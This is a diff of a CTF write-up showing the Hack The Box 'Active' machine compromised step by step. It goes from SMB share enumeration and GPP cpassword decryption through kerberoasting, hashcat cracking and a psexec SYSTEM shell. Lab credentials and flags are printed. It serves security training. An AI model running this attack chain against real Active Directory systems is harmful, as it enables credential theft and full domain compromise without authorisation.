@@ -1,18 +1,12 @@
 # :game_die: Hacking Active on Hack the Box: A Step-By-Step OSCP Journey
 
-> **Original Source:** [Hacking Active on Hack the Box: A Step-By-Step OSCP Journey](https://infosecwriteups.com/hacking-active-on-hack-the-box-a-step-by-step-oscp-journey-52e2b106555d)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 Once more, we’re embarking on an exploration of an Active Directory machine, and our target now is Active. While this machine presents a direct challenge, it’s pivotal in acquainting us with core Active Directory assault techniques. It’s a practical phase, laying the groundwork for the stringent tests inherent in the OSCP preparation. Our strategy transcends mere attack; it involves a deep dive into, thorough analysis of, and mastery over the tactics that shape the cybersecurity domain. This task is not merely a preliminary exercise but a critical building block in our path to achieving heightened expertise in cybersecurity.
 
-
 *Active Directory Digital Landscape*
 
-
 We kick things off with a basic nmap scan:
-
 
 ```
 nmap 10.129.34.246
@@ -43,9 +37,7 @@ PORT STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 15.82 seconds
 ```
 
-
 The initial nmap scan has uncovered several ports indicative of a Windows environment, including LDAP on port 389, MSRPC on port 135, Kerberos on port 88, and Microsoft-DS on port 445. To glean deeper insights, I’ll execute a more thorough nmap scan targeting these specific ports, utilizing scripts to extract detailed information and potentially uncover vulnerabilities or misconfigurations.
-
 
 ```
 ```
@@ -85,20 +77,15 @@ Nmap done: 1 IP address (1 host up) scanned in 31.52 seconds
 ```
 ```
 
-
 Confirmed, it’s a Windows Server 2008 R2 SP1 system, just as we anticipated. Now, it’s time to escalate our reconnaissance, focusing more sharply on this specific environment. We’ll deploy targeted techniques to unearth vulnerabilities, configurations, and services that could be exploited. This phase is critical in crafting a precise attack vector.
 
-
 We will start with enum4linux
-
 
 ```
 enum4linux -a 10.129.34.246
 ```
 
-
 We get some interesting output, confirming some SMB shares:
-
 
 ```
 Sharename Type Comment
@@ -112,17 +99,13 @@ SYSVOL Disk Logon server share
 Users Disk
 ```
 
-
 The full output of the tool shows we may have some read access on the Replication share. Let’s run another tool and see if we find anything else. This time lets use smbmap
-
 
 ```
 smbmap -H 10.129.34.246 -r
 ```
 
-
 *The -H flag is for “host” which is followed by the IP address, the -r flag is for “recursive” which allows the tool to search into each fileshare and show us whats inside:*
-
 
 ```
 smbmap -H 10.129.34.246 -r
@@ -157,20 +140,15 @@ SYSVOL NO ACCESS Logon server share
 Users
 ```
 
-
 With access to the Replication share confirmed, our next step is to search its contents. We're searching for valuable data—credentials, configuration details and files, or sensitive information—that could be exploited, random notes from employees or users. As we sift through files looking for anything that might strengthen our foothold or reveal the network's vulnerabilities.
 
-
 We will connect using smbclient:
-
 
 ```
 smbclient //10.129.34.246/Replication -N
 ```
 
-
 *The -N flag means “no-pass or no password”.*
-
 
 ```
 └─$ smbclient //10.129.34.246/Replication -N
@@ -184,15 +162,11 @@ active.htb D 0 Sat Jul 21 06:37:44 2018
 5217023 blocks of size 4096. 278370 blocks available
 ```
 
-
 Time to take a look inside “active.htb”.
-
 
 To navigate these file shares, you can type “help” which gives you the basic commands. Essentially we’re using “cmd prompt” commands, where “dir” replaces the linux version of “ls” to list out files and folders in your current working directory.
 
-
 After some digging through the files and folders, we come across something interesting finally: “Groups.xml”. I’ll use “get Groups.xml” command to download this and examine it on our attack machine.
-
 
 ```
 smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> cd Groups
@@ -207,9 +181,7 @@ smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Prefere
 getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
 ```
 
-
 Discovering a username “SVC_TGS” along with a cpassword hash is a significant find. The cpassword hash is typically associated with Group Policy Preferences (GPP) and can often be decrypted due to the well-known AES key Microsoft used, which is publicly available.
-
 
 ```
 └─$ cat Groups.xml
@@ -218,54 +190,39 @@ Discovering a username “SVC_TGS” along with a cpassword hash is a significan
 </Groups>
 ```
 
-
 I searched and found a couple of articles that dive deep into the mechanics of decrypting the “cpassword” from Group Policy Preferences files:
-
 
 - There’s a breakdown on [infinitelogins.com](https://infinitelogins.com/2020/09/07/cracking-group-policy-preferences-file-gpp-xml/) that walks through the decryption process, step by meticulous step.
 
 - Then, [adsecurity.org](https://adsecurity.org/?p=2288) offers a detailed exposition, shedding light on the nuances of this vulnerability.
 
-
 These pieces are more than just tutorials; they’re blueprints for piercing through the veil of encryption, exploiting a well-known but still glaring flaw in Microsoft’s design. They’re essential for anyone looking to leverage this particular chink in the armor of a supposedly secure system.
-
 
 The following is an excerpt:
 “*However, if you come across an old GPP XML file, you may be able to extract a password hash from it. The file is typically found at path similar to the one shown below.`\hostname.domain\Policies\{00000000–0000–0000–0000–00000000000}\MACHINE\Preferences\Groups\Groups.xml`*
 
-
 ## Get enigma_’s stories in your inbox
-
 
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
-
 
 *As an example, we found a file on Active at *[Hack The Box](https://hacktheboxltd.sjv.io/19ZM06)* that looks like the following. Within Line 2, there is a cpassword hash that we can extract.|1<br><br>2<br><br>3|`<?``xml` `version``=``”1.0"` `encoding``=``”utf-8"``?>`<br><br>`<``Groups` `clsid``=``”{3125E937-EB16–4b4c-9934–544FC6D24D26}”``><``User` `clsid``=``”{DF5F1855–51E5–4d24–8B1A-D9BDE98BA1D1}”` `name``=``”active.htb\SVC_TGS”` `image``=``”2"` `changed``=``”2018–07–18 20:46:06"` `uid``=``”{EF57DA28–5F69–4530-A59E-AAB58578219D}”``><``Properties` `action``=``”U”` `newName``=``””` `fullName``=``””` `description``=``””` `cpassword``=``”edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ”` `changeLogon``=``”0"` `noChange``=``”1"` `neverExpires``=``”1"` `acctDisabled``=``”0"` `userName``=``”active.htb\SVC_TGS”``/></``User``>`<br><br>`</``Groups``>`|If we extract that password, we can use a tool to crack it.`gpp-decrypt <hash>`Note: If you don’t have this tool, you can download it with the following command: `sudo apt install gpp-decrypt`*"
 
-
 Let’s try this out and see what we get from the cpassword hash:
-
 
 ```
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18
 ```
 
-
 Works instantly and we get our password for a foothold.
-
 
 With the password “GPPstillStandingStrong2k18” in hand, our next step is kerberoasting. This technique targets the Kerberos protocol, specifically aiming to extract service account credentials. We’ll use this password to request service tickets, which can then be cracked offline to potentially uncover more passwords, possibly linked to accounts with elevated privileges.
 
-
 Kerberoasting allows us to methodically identify and exploit weaknesses in the way Kerberos handles service tickets, giving us a strategic advantage. It’s a precise approach, focusing on extracting valuable data while minimizing noise and avoiding detection. This step is crucial in our penetration testing process, providing a pathway to deeper access and insight into the network’s security posture.
 
-
 The tool we use for kerberoasting is “GetUserSPNs.py” which is part of the Impacket python toolkit.
-
 
 ```
 $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.34.246 -request
@@ -287,33 +244,25 @@ da100b671d6094ac913a94221a99ad15d189d970bcf6dff6ae90456dba4f79cad6bc869620cd407a
 d3fe2881530b19b80c16544366d3210c2997e0caad089
 ```
 
-
 And just that, we have obtained the Administrator password hash. Our very next step is to attempt to crack this hash using Hashcat.
 
-
 First we need to find the hashcat code for the hash type. Since we know it’s kerberos, I like to use the following to narrow it down:
-
 
 ```
 hashcat -h | grep Kerberos
 ```
 
-
 We choose 13100, because in the hash description at the very beginning we see:
-
 
 ```
 $krb5tgs$23$
 ```
 
-
 So, I’ll use good old ‘rockyou.txt’ wordlist to crack this with the following command:
-
 
 ```
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
-
 
 ```
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$891b056c46ef5bebb2a00d75ca25bef7$6d4a146f8d5f8381ac650bdae8d3578f6f9c331765f3377f071781fddbaf98ca3841835b4699da268ccb509cf68163d2fd295d350e102667f448c402612c7a5376c2
@@ -327,18 +276,13 @@ b5a9e739065638eaf0c88567dd617c52fe46501b45b2818cf0ac95cf42db5a7b025adc9a4ab0ca21
 20e81fda66f2ee7a65d7fbf0f73c4dc6bf63e7dc2a0b3:Ticketmaster1968
 ```
 
-
 We have our admin credentials:
-
 
 Username: Administrator
 
-
 Password: Ticketmaster1968
 
-
 The final step is to try to gain shell access and find our flags. For this, we can keep it simple with psexec.py.
-
 
 ```
 ─$ psexec.py active/Administrator:'Ticketmaster1968'@10.129.34.246
@@ -358,9 +302,7 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
-
 We have full control of this system now as Administrator. We can grab both user and root flags easily now:
-
 
 ```
 cd C:\Users\Administrator\Desktop
@@ -378,21 +320,14 @@ Directory of C:\Users\Administrator\Desktop
 1 File(s) 34 bytes
 2 Dir(s) 1.071.534.080 bytes free
 
-
 C:\Users\Administrator\Desktop>type root.txt
 edd6e9ea85479f05bdf6e814a4b42d7c
 ```
 
-
 Mission accomplished.
 
-
 We learned how to use enum4linux, smbmap, smbclient to access smb shares and gain valuable account information to gain a foothold. From here, we leveraged those credentials to escalate our privileges up to Administrator via a kerberoasting attack which gave us full control over the system and access to the root directory.
-
 
 Until next time.
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/hacking-active-on-hack-the-box-a-step-by-step-oscp-journey-52e2b106555d). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
